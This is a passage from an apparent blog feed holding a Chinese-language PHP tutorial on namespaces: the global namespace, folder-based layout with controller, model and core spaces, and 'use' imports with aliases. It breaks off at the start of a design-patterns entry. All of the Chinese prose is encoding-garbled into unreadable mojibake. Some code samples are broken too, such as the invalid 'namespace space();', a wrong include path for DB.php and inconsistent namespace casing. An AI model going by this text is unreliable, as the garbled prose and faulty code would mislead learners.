·çš„ï¼Œå¦‚æœä¸€ä¸ªæ–‡ä»¶æœ‰ç©ºé—´ï¼ŒåŒ…å«äº†ä¸€ä¸ªæ²¡æœ‰ç©ºé—´ï¼ˆå…¨å±€ç©ºé—´ï¼‰çš„æ–‡ä»¶ï¼Œé‚£ä¹ˆè¦è®¿é—®æ–‡ä»¶ä¸­çš„å†…å®¹ï¼Œéœ€è¦ä½¿ç”¨å…¨å±€ç©ºé—´</p><pre><code># æ— ç©ºé—´æ–‡ä»¶ï¼šnospace.phpfunction display(){                # å±äºå…¨å±€ç©ºé—´    echo __FUNCTION__;}# æœ‰ç©ºé—´æ–‡ä»¶namespace space();function display(){    echo &apos;space&apos;;}# åŒ…å«æ— ç©ºé—´æ–‡ä»¶include_once &apos;nospace.php&apos;;# è®¿é—®å…ƒç´ display();                    # è®¿é—®çš„æ˜¯spaceç©ºé—´ä¸‹çš„displayå‡½æ•°\display();                    # æ­£ç¡®ï¼šè®¿é—®å…¨å±€ç©ºé—´çš„displayå‡½æ•°# æ³¨æ„ï¼šå¦‚æœspaceç©ºé—´æ²¡æœ‰displayçš„è¯ï¼Œç›´æ¥è®¿é—®displayå‡½æ•°ä¹Ÿæ˜¯æ­£ç¡®çš„ï¼Œå› ä¸ºç³»ç»Ÿä¼šè‡ªåŠ¨å¯»æ‰¾å…¨å±€ç©ºé—´</code></pre><blockquote><p>å°ç»“</p></blockquote><p>1ã€å…¨å±€ç©ºé—´å°±æ˜¯æ²¡æœ‰ä½¿ç”¨namespaceå®šä¹‰ç©ºé—´çš„ç©ºé—´ï¼ˆæ‰€æœ‰ç©ºé—´æœ¬è´¨éƒ½æ˜¯åœ¨å…¨å±€ç©ºé—´ä¸‹åˆ’åˆ†ï¼‰</p><p>2ã€å…¨å±€ç©ºé—´çš„å…ƒç´ è®¿é—®ä½¿ç”¨å®Œå…¨é™å®šåç§°è®¿é—®</p><p>3ã€ç³»ç»Ÿå†…ç½®çš„å‡½æ•°ã€å¸¸é‡å’Œç±»éƒ½å±äºå…¨å±€ç©ºé—´ï¼ˆæ¶‰åŠåˆ°å…¨å±€ç©ºé—´è¢«åŒ…å«åˆ°å­ç©ºé—´é‡Œï¼‰</p><ul><li>ç³»ç»Ÿå‡½æ•°ã€å¸¸é‡ï¼Œåœ¨ç©ºé—´å†…è®¿é—®çš„æ—¶å€™ç³»ç»Ÿä¼šè‡ªåŠ¨åœ¨è‡ªå·±ç©ºé—´æ‰¾ï¼Œå¦‚æœæ‰¾ä¸åˆ°ä¼šå»å…¨å±€ç©ºé—´</li><li>ç³»ç»Ÿç±»å¿…é¡»ä½¿ç”¨å…¨å±€ç©ºé—´è®¿é—®ï¼š\ç±»å</li></ul><h2 id="5ã€å‘½åç©ºé—´åº”ç”¨"><a href="#5ã€å‘½åç©ºé—´åº”ç”¨" class="headerlink" title="5ã€å‘½åç©ºé—´åº”ç”¨"></a><strong>5ã€å‘½åç©ºé—´åº”ç”¨</strong></h2><blockquote><p>ç›®æ ‡ï¼šæ ¹æ®å®é™…å¼€å‘éœ€æ±‚ï¼Œè®¾å®šåˆé€‚çš„å‘½åç©ºé—´è¿›è¡Œç®¡ç†</p></blockquote><blockquote><p>æ¦‚å¿µ</p></blockquote><p><strong>å‘½åç©ºé—´åº”ç”¨</strong>ï¼šæ¨¡æ‹ŸçœŸå®çš„å¼€å‘ç¯å¢ƒï¼Œæ¥è¿ç”¨å‘½åç©ºé—´çš„è§„åˆ™</p><ul><li>å‘½åç©ºé—´åˆ†å±‚ä¸€èˆ¬æ˜¯æ–‡ä»¶å¤¹è¿›è¡Œåˆ†å±‚ï¼ˆå»ºè®®ä½¿ç”¨ä¸æ–‡ä»¶å¤¹åŒåç©ºé—´åï¼‰</li><li>æ–‡ä»¶å¤¹çš„åˆ†å±‚æ˜¯æ ¹æ®ä¸šåŠ¡çš„éœ€æ±‚å’Œé¡¹ç›®å¼€å‘æ‰€é€‰çš„å¤æ‚ç¨‹åº¦æ¥è®¾è®¡</li></ul><blockquote><p>æ­¥éª¤</p></blockquote><p>1ã€ç¡®å®šé¡¹ç›®å¼€å‘å¤æ‚ç¨‹åº¦</p><p>2ã€å®ç°æ–‡ä»¶åˆ†å±‚ç®¡ç†å¸ƒå±€</p><p>3ã€é’ˆå¯¹æ–‡ä»¶åˆ†å±‚è¿›è¡Œå‘½åç©ºé—´çš„ä½¿ç”¨ï¼ˆä¸€ä¸ªæ–‡ä»¶åªå±äºä¸€ä¸ªç©ºé—´ï¼‰</p><blockquote><p>ç¤ºä¾‹</p></blockquote><p>1ã€åˆ›å»ºæ–‡ä»¶å¤¹ï¼šæ¨¡æ‹Ÿé¡¹ç›®ä¸åŒæ–‡ä»¶PHPæ–‡ä»¶æ”¾åˆ°ä¸åŒæ–‡ä»¶å¤¹ä¸‹</p><p>â€“|root â€”â€”â€“æ ¹ç›®å½•</p><p>â€“|â€“|controller â€”â€”â€“ä¸šåŠ¡æ¨¡å—</p><p>â€“|â€“|model â€”â€”â€“æ•°æ®æ¨¡å—</p><p>â€“|â€“|core â€”â€”â€“æ ¸å¿ƒå·¥å…·</p><p>2ã€ä¸šåŠ¡è¯´æ˜</p><ul><li>rootæ ¹ç›®å½•ï¼Œå­˜æ”¾ç”¨æˆ·å¯ä»¥ç›´æ¥è®¿é—®çš„æ–‡ä»¶ï¼Œæ–‡ä»¶éƒ½æ˜¯è¯·æ±‚controlleré‡Œçš„æ–‡ä»¶</li><li>controllerç›®å½•ï¼Œå­˜æ”¾ä¸šåŠ¡é€»è¾‘æ–‡ä»¶ï¼Œæ‰€æœ‰ä¸šåŠ¡éƒ½æ˜¯ç±»æ–‡ä»¶ï¼Œä¸šåŠ¡è¦æ“ä½œæ•°æ®åº“ï¼Œè¯·æ±‚modelé‡Œçš„æ–‡ä»¶ï¼Œå±äºcontrollerç©ºé—´</li><li>modelç›®å½•ï¼Œå­˜æ”¾æ•°æ®åº“æ“ä½œçš„ç±»æ–‡ä»¶ï¼Œä¸€å¼ è¡¨ä¸€ä¸ªç±»æ–‡ä»¶ï¼Œå±äºmodelç©ºé—´</li><li>coreç›®å½•ï¼Œæ ¸å¿ƒå·¥å…·çš„å­˜æ”¾ï¼Œå±äºcoreç©ºé—´</li></ul><p>3ã€åˆ›å»º3ä¸ªæ–‡ä»¶ï¼šåˆ†è¡¨ä»£è¡¨rootç›®å½•ä¸‹ï¼ˆä¸éœ€è¦ç©ºé—´ï¼‰ï¼Œcontrollerç›®å½•ä¸‹ï¼Œcontrollerç©ºé—´ï¼Œmodelç›®å½•ä¸‹çš„modelç©ºé—´</p><pre><code># rootç›®å½•ä¸‹ï¼šindex.php# å•¥éƒ½ä¸ç”¨åšï¼Œç›´æ¥åŒ…å«controlleræ–‡ä»¶include_once &apos;controller/User.php&apos;;# $u = new User();                            # é”™è¯¯ï¼šå½“å‰ç©ºé—´æ²¡æœ‰Userç±»$u = new controller\User();                     # é™å®šåç§°è®¿é—®ï¼šå› ä¸ºcontrollerç©ºé—´å±äºå…¨å±€ç©ºé—´$u-&gt;display();# root/coreç›®å½•ä¸‹ï¼šDB.phpnamespace core;class DB{    private $link;    public function __construct(){        # æ•°æ®åº“åˆå§‹åŒ–    }    # ç®€å•æ•ˆæœï¼šæŸ¥è¯¢å…¨éƒ¨æ•°æ®    public function getAll($sql){        return &apos;æ•°æ®æŸ¥è¯¢ç»“æœ&lt;br&gt;&apos;;    }}# root/modelç›®å½•ä¸‹ï¼šUser.phpnamespace model;# åŠ è½½DBç±»include_once &apos;../DB.php&apos;;    # å»ºè®®ä½¿ç”¨ç»å¯¹è·¯å¾„ï¼š../å’Œ./éƒ½ä¼šå› ä¸ºåµŒå¥—åŒ…å«è€Œé”™è¯¯class User{    public function getAllUsers(){        # å‡è®¾æ•°æ®åº“è¿æ¥ã€æ•°æ®åº“ã€è¡¨éƒ½å·²ç»å­˜åœ¨        $sql = &quot;select * from user&quot;;        # è°ƒç”¨æ›´é«˜çº§çš„æ“ä½œç±»å®ç°SQLæ‰§è¡Œå¹¶è¿”å›ç»“æœï¼šDBå±äºCoreç©ºé—´ï¼Œä½¿ç”¨å®Œå…¨é™å®šåç§°è®¿é—®        $db = new \Core\DB();        return $db-&gt;getAll($sql);    }}# root/controllerç›®å½•ä¸‹ï¼šUser.phpnamespace controller;class User{    public function display(){        # è°ƒç”¨æ¨¡å‹ç›®å½•ä¸‹çš„userç±»å®ç°æ•°æ®åº“æ“ä½œï¼šä½¿ç”¨å®Œå…¨é™å®šåç§°è®¿é—®        include_once &apos;../Model/User.php&apos;;    # å»ºè®®ä½¿ç”¨ç»å¯¹è·¯å¾„ï¼š../å’Œ./éƒ½ä¼šå› ä¸ºåµŒå¥—åŒ…å«è€Œé”™è¯¯        $u = new \Model\User();        $users = $u-&gt;getAllUsers();        var_dump($users);    }}</code></pre><p>4ã€ä»£ç è¯´æ˜</p><ul><li>index.phpåœ¨rootç›®å½•ä¸‹ï¼Œæ²¡æœ‰å®šä¹‰ç©ºé—´ï¼Œå†…éƒ¨å…ƒç´ å±äºå…¨å±€ç©ºé—´ï¼šindex.phpåŒ…å«äº†å­ç›®å½•controllerä¸‹çš„User.phpï¼Œè€ŒUserç±»å±äºcontrollerç©ºé—´ï¼Œæ‰€ä»¥åœ¨index.phpä¸­è®¿é—®Userç±»çš„ä½¿ç”¨ï¼Œå¯ä»¥ä½¿ç”¨é™å®šåç§°ï¼ˆå…¨å±€ç©ºé—´çš„å­ç©ºé—´controller\ç©ºé—´å…ƒç´ ï¼‰ï¼Œæˆ–è€…å®Œå…¨é™å®šåç§°ï¼ˆ\å­ç©ºé—´\ç©ºé—´å…ƒç´ ï¼‰</li><li>controller/User.phpåœ¨root/controlleræ–‡ä»¶å¤¹ä¸‹ï¼Œå®šä¹‰äº†ç©ºé—´controllerï¼Œæ‰€ä»¥æ–‡ä»¶é‡Œé¢æ‰€æœ‰çš„è®¿é—®ï¼Œé»˜è®¤éƒ½æ˜¯åœ¨controllerä¸‹æ‰¾ã€‚controller/Userç±»ä¸­ç”¨åˆ°äº†model/Userç±»ï¼Œæ‰€ä»¥éœ€è¦ä½¿ç”¨å®Œå…¨é™å®šåç§°è®¿é—®ï¼ˆåŒçº§åˆ«ä¸åŒç©ºé—´ï¼‰\model\User</li><li>model/User.phpåœ¨root/modelæ–‡ä»¶å¤¹ä¸‹ï¼Œå®šä¹‰äº†ç©ºé—´modelï¼Œæ‰€ä»¥æ–‡ä»¶é‡Œæ‰€æœ‰çš„è®¿é—®ï¼Œé»˜è®¤éƒ½æ˜¯åœ¨modelä¸‹æ‰¾ã€‚model/Userç±»ä¸­ç”¨åˆ°äº†core/DBç±»ï¼Œæ‰€ä»¥éœ€è¦ä½¿ç”¨å®Œå…¨é™å®šåç§°è®¿é—®\core\DB</li><li>core/DB.phpåœ¨root/coreæ–‡ä»¶å¤¹ä¸‹ï¼Œå®šä¹‰äº†ç©ºé—´core</li></ul><blockquote><p>å°ç»“</p></blockquote><p>1ã€ç©ºé—´çš„å®é™…åº”ç”¨æ˜¯ä»¥æ–‡ä»¶ä¸ºå•ä½å®šä¹‰ç©ºé—´çš„</p><p>2ã€ç©ºé—´çš„åˆ’åˆ†æ˜¯æŒ‰ä¸šåŠ¡å¯¹åº”çš„è„šæœ¬è¿›è¡Œåˆ’åˆ†çš„ï¼Œå¦‚ä¸šåŠ¡controllerï¼Œæ•°æ®modelä¹‹ç±»</p><p>3ã€æ–‡ä»¶çš„åŒ…å«å’Œç©ºé—´çš„åŒ…å«æ²¡æœ‰è”ç³»ï¼ŒäºŒè€…æ˜¯ç‹¬ç«‹çš„ï¼šæ–‡ä»¶æ˜¯åœ¨åŠ è½½æ–‡ä»¶æ—¶ï¼Œè€Œç©ºé—´æ˜¯åœ¨è¿›å…¥å†…å­˜å</p><p>4ã€ç©ºé—´åº”ç”¨ï¼Œé€šå¸¸æ˜¯é‡‡ç”¨éé™å®šåç§°ï¼ˆè‡ªå·±ç©ºé—´é‡Œï¼‰å’Œå®Œå…¨é™å®šåç§°è®¿é—®ï¼ˆå…¶ä»–ç©ºé—´ï¼‰ï¼Œå®é™…ä¸Šæˆ‘ä»¬å»ºè®®å°†å®Œå…¨é™å®šåç§°è½¬æ¢æˆéé™å®šåç§°</p><h2 id="6ã€å‘½åç©ºé—´å¼•å…¥"><a href="#6ã€å‘½åç©ºé—´å¼•å…¥" class="headerlink" title="6ã€å‘½åç©ºé—´å¼•å…¥"></a><strong>6ã€å‘½åç©ºé—´å¼•å…¥</strong></h2><blockquote><p>ç›®æ ‡ï¼šç†è§£ç©ºé—´å¼•å…¥çš„é€»è¾‘å’Œä¼˜åŠ¿ï¼ŒæŒæ¡ç©ºé—´å¼•å…¥</p></blockquote><blockquote><p>æ¦‚å¿µ</p></blockquote><p><strong>å‘½åç©ºé—´å¼•å…¥</strong>ï¼šæ˜¯å°†å¦å¤–ä¸€ä¸ªç©ºé—´çš„å…ƒç´ å¼•å…¥åˆ°å½“å‰ç©ºé—´æ¥ï¼Œå½“åšå½“å‰ç©ºé—´çš„å…ƒç´ è®¿é—®</p><ul><li>ç©ºé—´å…ƒç´ å¼•å…¥å¯ä»¥å‡å°‘å¤æ‚çš„å®Œå…¨é™å®šåç§°è®¿é—®ï¼Œå–è€Œä»£ä¹‹çš„æ˜¯éé™å®šåç§°è®¿é—®</li><li>å¯ä»¥å¿«é€Ÿçš„å®ç°å°†å½“å‰éœ€è¦ä½¿ç”¨çš„ç©ºé—´å…ƒç´ å¼•å…¥åˆ°å½“å‰æ–‡ä»¶</li><li><p>ç©ºé—´å¼•å…¥è¯­æ³•ï¼šuseå…³é”®å­—</p><ul><li>å…ƒç´ å…³é”®å­—ï¼šé»˜è®¤æ˜¯ç±»ï¼Œå¯ä»¥æœ‰functionï¼ˆå‡½æ•°ï¼‰å’Œconstï¼ˆå¸¸é‡ï¼‰</li></ul><p>use [å…ƒç´ å…³é”®å­—] []ç©ºé—´å\å…ƒç´ å;    # ç©ºé—´åæ˜¯ä¸€çº§ç©ºé—´</p></li><li><p>åˆ«åï¼šå¼•å…¥çš„å…ƒç´ ä¸å½“å‰ç©ºé—´å·²æœ‰å…ƒç´ é‡åæˆ–è€…æƒ³æ¢æˆå…¶ä»–åˆé€‚çš„åå­—</p><ul><li>ä½¿ç”¨åˆ«ååï¼ŒåŸæ¥çš„åå­—åœ¨å½“å‰å°±ä¸å¯ç”¨ï¼Œåªèƒ½ä½¿ç”¨åˆ«å</li></ul><p>use [å…ƒç´ å…³é”®å­—] ç©ºé—´å\å…ƒç´ å as åˆ«å;</p></li><li><p>ç©ºé—´å¼•å…¥ï¼šå¯ä»¥ä¸€æ¬¡æ€§å¼•å…¥ä¸€ä¸ªç©ºé—´çš„æ‰€æœ‰å…ƒç´ ï¼Œæˆ–è€…æŸä¸ªç©ºé—´æŒ‡å®šç±»å‹çš„å¤šä¸ªå…ƒç´ </p><ul><li>ç©ºé—´å¼•å…¥æ˜¯å°†è¢«å¼•å…¥çš„ç©ºé—´çš„æœ€åä¸€çº§ç©ºé—´ï¼Œå½“åšå½“å‰ç©ºé—´çš„å­ç©ºé—´</li><li>ç±»å¼•å…¥ä¸éœ€è¦classå…³é”®å­—ï¼ˆé»˜è®¤å°±æ˜¯classï¼‰</li></ul><h1 id="å¼•å…¥å¤šä¸ªå…ƒç´ "><a href="#å¼•å…¥å¤šä¸ªå…ƒç´ " class="headerlink" title="å¼•å…¥å¤šä¸ªå…ƒç´ "></a>å¼•å…¥å¤šä¸ªå…ƒç´ </h1><p>use [å…ƒç´ å…³é”®å­—] ç©ºé—´å\å…ƒç´ å1 [as åˆ«å],ç©ºé—´å\å…ƒç´ å2 â€¦;    # ç©ºé—´åå¯ä»¥ä¸åŒï¼Œä½†æ˜¯å…ƒç´ ç±»å‹å¿…é¡»ç›¸åŒ</p><h1 id="å¼•å…¥ç©ºé—´ï¼ˆå…¨éƒ¨å…ƒç´ ï¼‰"><a href="#å¼•å…¥ç©ºé—´ï¼ˆå…¨éƒ¨å…ƒç´ ï¼‰" class="headerlink" title="å¼•å…¥ç©ºé—´ï¼ˆå…¨éƒ¨å…ƒç´ ï¼‰"></a>å¼•å…¥ç©ºé—´ï¼ˆå…¨éƒ¨å…ƒç´ ï¼‰</h1><p>use ç©ºé—´å;        # å°†å½“å‰å¼•å…¥çš„ç©ºé—´ï¼ˆæœ€åä¸€çº§ï¼‰å½“å‰å½“å‰æ‰€åœ¨ç©ºé—´çš„å­ç©ºé—´</p></li></ul><blockquote><p>ç¤ºä¾‹</p></blockquote><p>1ã€ç©ºé—´å¼•å…¥æ–¹å¼ï¼šuseå…³é”®å­—</p><pre><code>namespace space;class Man{}namespace space1;# å¼•å…¥ç©ºé—´å…ƒç´ use space\Man;new Man();</code></pre><p><strong>æ³¨æ„</strong>ï¼šuseè¿›è¡Œç©ºé—´åŒ…å«çš„æ—¶å€™ï¼Œé»˜è®¤æ˜¯ä»å…¨å±€ç©ºé—´å¼€å§‹æ„å»ºç©ºé—´è·¯å¾„çš„ï¼ˆä¸æ˜¯è‡ªå·±ç©ºé—´çš„ç›¸å¯¹è·¯å¾„ï¼‰ï¼Œæ‰€ä»¥ä¸Šè¿°ä»£ç ç­‰ä»·äºä»¥ä¸‹ä»£ç </p><pre><code>namespace space;class Man{}namespace space1;# å¼•å…¥ç©ºé—´å…ƒç´ use \space\Man;</code></pre><p>2ã€ç©ºé—´å¼•å…¥çš„å…ƒç´ é»˜è®¤æ˜¯ç±»ï¼Œå¦‚æœè¦å¼•å…¥å…¶ä»–å…ƒç´ ï¼Œå°±å¿…é¡»ä½¿ç”¨ç›¸åº”å…³é”®å­—ï¼šfunctionå’Œconst</p><pre><code>namespace space;function display(){}class Man{}const PI = 3.14;namespace space1;# å¼•å…¥ç©ºé—´å…ƒç´ use function space\display;         # å¼•å…¥å‡½æ•°use space\Man;                    # å¼•å…¥ç±»use const space\PI;                # å¼•å…¥å¸¸é‡display();                        new Man();echo PI;                            </code></pre><p>3ã€å¦‚æœè¢«å¼•å…¥çš„å…ƒç´ åœ¨å½“å‰ç©ºé—´å·²ç»å­˜åœ¨ï¼Œåˆ™ä¼šå‡ºç°é‡åï¼Œè§£å†³æ–¹æ¡ˆæ˜¯ä½¿ç”¨åˆ«å as alias</p><pre><code>namespace space;function display(){}class Man{}const PI = 3.14;namespace space1;class Man{}# å¼•å…¥ç©ºé—´å…ƒç´ # use space\Man;                # é”™è¯¯ï¼šå½“å‰ç©ºé—´å·²ç»å­˜åœ¨Manuse space\Man as M;use function space\display as dis;use const space\PI as D;</code></pre><p>4ã€ä¸€æ—¦å¼•å…¥çš„æ—¶å€™ä½¿ç”¨äº†åˆ«åï¼Œé‚£ä¹ˆåœ¨ä½¿ç”¨çš„æ—¶å€™å°±ç›´æ¥é€šè¿‡åˆ«åä½¿ç”¨</p><pre><code>namespace space;function display(){}class Man{}namespace space1;class Man{}# å¼•å…¥ç©ºé—´å…ƒç´ use space\Man as M;new M();                # ä½¿ç”¨åˆ«å</code></pre><p>5ã€å¦‚æœä¸€ä¸ªç©ºé—´æœ‰å¤šä¸ªå…ƒç´ è¦å¼•å…¥ï¼Œé‚£ä¹ˆå¯ä»¥è¿›è¡Œä¸€æ¬¡å¼•å…¥å¤šä¸ªï¼Œä½¿ç”¨é€—å·<code>,</code>åˆ†éš”å³å¯</p><pre><code>namespace space;function display(){}class Man{}class Woman{}namespace space1;class Man{}# ä¸€æ¬¡å¼•å…¥å¤šä¸ªuse space\Man as M,space\Woman;        # è™½ç„¶å¯ä»¥æ‰¹é‡å¼•å…¥ï¼ˆä¸åŒç©ºé—´ä¹Ÿè¡Œï¼‰ï¼Œä½†æ˜¯æ¯ä¸ªå…ƒç´ éƒ½éœ€è¦å¸¦ä¸Šç©ºé—´# å¼•å…¥äº†ä¸€ä¸ªManç±»åˆ«åä¸ºMï¼ŒWomanç±»æ²¡æœ‰å®šä¹‰åˆ«å</code></pre><p>6ã€å¦‚æœè¯´ç¡®å®šä¸€ä¸ªç©ºé—´é‡Œçš„æ‰€æœ‰å…ƒç´ éƒ½éœ€è¦å¼•å…¥è¿›æ¥ï¼Œä¹Ÿå¯ä»¥ç›´æ¥å¼•å…¥ç©ºé—´</p><pre><code>namespace space;class Man{}namespace space1;# å¼•å…¥ç©ºé—´use space;</code></pre><p>7ã€å¦‚æœæ˜¯ç›´æ¥è¿›è¡Œç©ºé—´å¼•å…¥ï¼Œéé™å®šåç§°çš„è®¿é—®è®¿é—®çš„åªä¼šæ˜¯å½“å‰è‡ªå·±ç©ºé—´è€Œéå¼•å…¥çš„ç©ºé—´ï¼Œè¦è®¿é—®å¼•å…¥ç©ºé—´ï¼Œå¾—ä½¿ç”¨é™å®šåç§°è®¿é—®ï¼šå³å¼•å…¥çš„ç©ºé—´æœ€åä¸€çº§ç©ºé—´åå­—+å…ƒç´ ï¼ˆå¼•å…¥ç©ºé—´å½“åšå½“å‰ç©ºé—´çš„å­ç©ºé—´ï¼‰</p><pre><code>namespace space\space1\space2;class Man{}namespace space3;class Man{}# å¼•å…¥ç©ºé—´use space\space1\space2;new Man();                        # è®¿é—®çš„æ˜¯space3\Mannew space2\Man();                # ä½¿ç”¨å¼•å…¥ç©ºé—´çš„æœ€åä¸€çº§ç©ºé—´è®¿é—®</code></pre><blockquote><p>å°ç»“</p></blockquote><p>1ã€ç©ºé—´å¼•å…¥æ˜¯è§£å†³è®¿é—®æ—¶çš„éº»çƒ¦ï¼šç”±å®Œå…¨é™å®šåç§°ï¼ˆé™å®šåç§°ï¼‰å˜æˆéé™å®šåç§°è®¿é—®</p><p>2ã€ç©ºé—´å…ƒç´ éƒ½å¯ä»¥å¼•å…¥ï¼Œä½†æ˜¯å¼•å…¥æ–¹å¼æœ‰åŒºåˆ«</p><ul><li>ç±»ç›´æ¥å¼•å…¥</li><li>å‡½æ•°éœ€è¦åœ¨useä¹‹åè·Ÿå…³é”®å­—function</li><li>å¸¸é‡éœ€è¦åœ¨useä¹‹åè·Ÿå…³é”®å­—const</li></ul><p>3ã€ç©ºé—´å¼•å…¥è¿‡ç¨‹ä¸­å¦‚æœå‡ºç°é‡åï¼Œéœ€è¦ä½¿ç”¨åˆ«åæ¥å¤„ç†ï¼Œå¼•å…¥ååœ¨ç©ºé—´é‡Œå¯ä»¥ç›´æ¥è®¿é—®åˆ«å</p><p>4ã€å¯ä»¥ä¸€æ¬¡æ€§å¼•å…¥å¤šä¸ªç©ºé—´å†…çš„å¤šä¸ªå…ƒç´ ï¼ˆç±»å‹ç›¸åŒï¼šæ¯ä¸ªå…ƒç´ å¿…é¡»åœ¨å‰é¢åŠ ä¸Šç©ºé—´è·¯å¾„ï¼‰</p><p>5ã€å¦‚æœå¿…è¦çš„æƒ…å†µä¸‹ï¼Œä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨ç©ºé—´å¼•å…¥ï¼Œä½†æ˜¯æ³¨æ„è¢«å¼•å…¥ç©ºé—´çš„å…ƒç´ ä¸å…è®¸ç›´æ¥ä½¿ç”¨éé™å®šåç§°è®¿é—®ï¼Œå¿…é¡»ä½¿ç”¨è¢«å¼•å…¥ç©ºé—´çš„æœ€åä¸€çº§ç©ºé—´+å…ƒç´ è®¿é—®ï¼ˆä¸å¸¸ä½¿ç”¨ï¼Œå¼•å…¥æ–¹ä¾¿ä½†æ˜¯ä½¿ç”¨ä¸æ–¹ä¾¿ï¼‰</p><h2 id="7ã€æ€»ç»“"><a href="#7ã€æ€»ç»“" class="headerlink" title="7ã€æ€»ç»“"></a>7ã€æ€»ç»“</h2><p>1ã€å‘½åç©ºé—´namespaceä¸æ˜¯PHPç‰¹æœ‰çš„ï¼Œæ˜¯å¾ˆå¤šç¼–ç¨‹è¯­è¨€éƒ½æœ‰çš„ç”¨æ¥è§£å†³ç»“æ„åŒåçš„æ–¹æ¡ˆ</p><p>2ã€å‘½åç©ºé—´ä¸€èˆ¬åªé’ˆå¯¹æŸä¸ªå…·ä½“çš„ç»“æ„ï¼ˆç±»å’Œå‡½æ•°ï¼Œè¾ƒå°‘é’ˆå¯¹å¸¸é‡ï¼‰</p><p>3ã€å‘½åç©ºé—´çš„å­˜åœ¨ä¼šè®©å…ƒç´ çš„è®¿é—®å˜å¾—ä¸é‚£ä¹ˆç›´æ¥ï¼Œæˆ‘ä»¬éœ€è¦é€‰æ‹©åˆé€‚çš„æ–¹å¼æ¥è°ƒç”¨</p><ul><li>éé™å®šåç§°è®¿é—®</li><li>é™å®šåç§°è®¿é—®</li><li>å®Œå…¨é™å®šåç§°è®¿é—®</li></ul><p>4ã€æˆç†Ÿçš„å¤§ä¸­å‹é¡¹ç›®éƒ½ä¼šä½¿ç”¨å‘½åç©ºé—´ï¼Œå‘½åç©ºé—´çš„å‘½åè§„èŒƒé€šå¸¸ä¸é¡¹ç›®çš„æ–‡ä»¶å¤¹åå­—åŒå</p><ul><li>æ–¹ä¾¿åæœŸå†…éƒ¨åŠ å·¥å¤„ç†ï¼šæ ¹æ®ç©ºé—´æ¥é€‰æ‹©æ–‡ä»¶æ‰€åœ¨è·¯å¾„ï¼ˆè‡ªåŠ¨åŠ è½½ï¼‰</li><li>æ–¹ä¾¿ç»´æŠ¤ï¼šæ ¹æ®ç©ºé—´æ¥æ‰¾åˆ°æ–‡ä»¶è¿›è¡Œç»´æŠ¤</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>phpé¢å‘å¯¹è±¡:è®¾è®¡æ¨¡å¼</title>
      <link href="/2021/07/25/php%E5%AD%A6%E4%B9%A0/3PHP%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%EF%BC%9A%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"/>
      <url>/2021/07/25/php%E5%AD%A6%E4%B9%A0/3PHP%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%EF%BC%9A%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h4 id="è½¬è½½äºï¼šé»‘é©¬ç¨‹åºå‘˜æ­¦æ±‰ä¸­å¿ƒ"><a href="#è½¬è½½äºï¼šé»‘é©¬ç¨‹åºå‘˜æ­¦æ±‰ä¸­å¿ƒ" class="headerlink" title="è½¬è½½äºï¼šé»‘é©¬ç¨‹åºå‘˜æ­¦æ±‰ä¸­å¿ƒ"></a>è½¬è½½äºï¼š<a href="https://space.bilibili.com/434398031?spm_id_from=333.788.b_765f7570696e666f.1" target="_blank" rel="noopener">é»‘é©¬ç¨‹åºå‘˜æ­¦æ±‰ä¸­å¿ƒ</a></h4><h1 id="è®¾è®¡æ¨¡å¼"><a href="#è®¾è®¡æ¨¡å¼" class="headerlink" title="è®¾è®¡æ¨¡å¼"></a><strong>è®¾è®¡æ¨¡å¼</strong></h1><blockquote><p>å­¦ä¹ ç›®æ ‡ï¼šäº†è§£è®¾è®¡æ¨¡å¼çš„æ¦‚å¿µï¼ŒæŒæ¡è®¾è®¡æ¨¡å¼åœ¨å¼€å‘ä¸­çš„å®é™…åº”ç”¨</p></blockquote><ul><li>å•ä¾‹æ¨¡å¼</li><li>å·¥å‚æ¨¡å¼</li></ul><blockquote><p>æ¦‚å¿µ</p></blockquote><p><strong>è®¾è®¡æ¨¡å¼</strong>ï¼šDesign patternï¼Œ æ˜¯è½¯ä»¶å¼€å‘äººå‘˜åœ¨è½¯ä»¶å¼€å‘è¿‡ç¨‹ä¸­é¢ä¸´çš„ä¸€èˆ¬é—®é¢˜çš„è§£å†³æ–¹æ¡ˆ</p><ul><li>è§£å†³æ–¹æ¡ˆæ˜¯ä¼—å¤šè½¯ä»¶å¼€å‘äººå‘˜ç»è¿‡ç›¸å½“é•¿çš„ä¸€æ®µæ—¶é—´çš„è¯•éªŒå’Œé”™è¯¯æ€»ç»“å‡ºæ¥çš„</li><li>è®¾è®¡æ¨¡å¼æœ‰å¾ˆå¤šï¼ˆ23ç§ä¹‹å¤šï¼‰ï¼Œåœ¨PHPä¸­é€šå¸¸åªç”¨ä¸¤ç§è®¾è®¡æ¨¡å¼<ul><li>å•ä¾‹æ¨¡å¼</li><li>å·¥å‚æ¨¡å¼</li></ul></li></ul><blockquote><p>ç¤ºä¾‹</p></blockquote><p>1ã€è®¾è®¡æ¨¡å¼æ˜¯é’ˆå¯¹æŸç§å¸¸è§çš„éœ€æ±‚è€Œæä¾›çš„ä¸€ç±»è§£å†³æ–¹æ¡ˆ</p><ul><li>windowsç³»ç»Ÿçš„èµ„æºç®¡ç†å™¨ç”¨æ¥æ˜¾ç¤ºè®¡ç®—æœºèµ„æºå ç”¨çš„æƒ…å†µ</li><li>èµ„æºç®¡ç†å™¨æœ¬èº«è¦å ç”¨èµ„æº</li><li>å¦‚æœè¦æ‰“å¼€å¤šä¸ªèµ„æºç®¡ç†å™¨ï¼Œæ˜¾ç¤ºçš„èµ„æºå ç”¨æƒ…å†µåº”è¯¥ä¸€è‡´ï¼Œè€Œèµ„æºç®¡ç†å™¨å ç”¨äº†æ›´å¤šçš„èµ„æº</li><li>å› æ­¤ï¼šèµ„æºç®¡ç†å™¨ä¸€ä¸ªå°±å¤Ÿäº†</li><li>é’ˆå¯¹ä¸Šè¿°éœ€æ±‚ï¼šæˆ‘ä»¬å¯ä»¥è®¾è®¡ä¸€ç§è§£å†³æ–¹æ¡ˆï¼Œä¿è¯èµ„æºç®¡ç†å™¨åªäº§ç”Ÿä¸€ä¸ª</li><li>åæ¥å‘ç°å…¶ä»–çš„éœ€æ±‚ä¹Ÿæœ‰åŒæ 